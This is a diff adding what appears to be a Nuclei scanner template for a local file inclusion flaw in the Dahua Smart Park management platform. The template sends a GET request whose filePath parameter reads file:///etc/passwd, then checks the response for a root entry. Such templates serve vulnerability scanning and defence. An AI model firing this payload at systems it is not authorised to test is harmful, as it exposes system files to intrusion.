@@ -1,0 +1,23 @@
+id: dahua-smart-park-download-fileread
+
+info:
+  name: 大华智慧园区综合管理平台 - Local File Inclusion
+  author: SleepingBag945
+  severity: high
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd"
+
+    host-redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+
+      - type: status
+        status:
+          - 200
